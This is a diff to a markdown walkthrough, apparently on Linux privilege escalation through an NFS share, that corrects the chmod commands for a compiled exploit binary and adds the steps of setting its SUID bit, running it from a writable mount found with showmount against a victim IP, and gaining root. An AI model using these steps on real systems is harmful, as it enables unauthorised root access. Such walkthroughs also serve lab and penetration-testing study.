@@ -277,17 +277,21 @@ Now compile the exploit:
 ```JavaScript
 gcc nfs.c -o nfs -w
 ```
-Give executable permissions and set the SUID bit
+Give executable permissions
 
 ```JavaScript
-chmod x+s nfs
+chmod +x nfs
+```
+Set the SUID bit
+```JavaScript
+chmod +s nfs
 ```
 
-****
-
-
+Now execute the binary in one of the writable mounted directories from the showmount -e <VictimIP> command. 
+  
+You should now be root
 ```JavaScript
-
+./nfs
 ```
 
 ****
